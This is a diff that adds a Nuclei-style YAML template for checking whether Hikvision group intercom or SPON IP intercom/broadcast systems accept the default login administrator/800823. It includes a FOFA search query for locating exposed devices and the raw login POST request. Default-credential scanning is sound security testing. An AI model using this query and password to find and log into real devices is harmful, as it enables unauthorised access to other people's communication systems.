@@ -1,0 +1,31 @@
+id: hikvision-spon-group-intercom-default-login
+info:
+  name: hikvision 群组对讲服务配置平台 or 世邦通信 SPON IP 网络对讲广播系统 - default-login
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - demo
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: icon_hash="-1830859634" || body="js/jquery.breadcrumbs.ex.js"
+    tips: 默认口令 administrator/800823
+  tags: spon,hikvision,default-login
+
+http:
+  - raw:
+      - |
+        POST /php/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded   
+
+        jsondata%5Busername%5D=administrator&jsondata%5Bpassword%5D=800823&jsondata%5Bisencrypted%5D=0
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'username','administrator')
+        condition: and
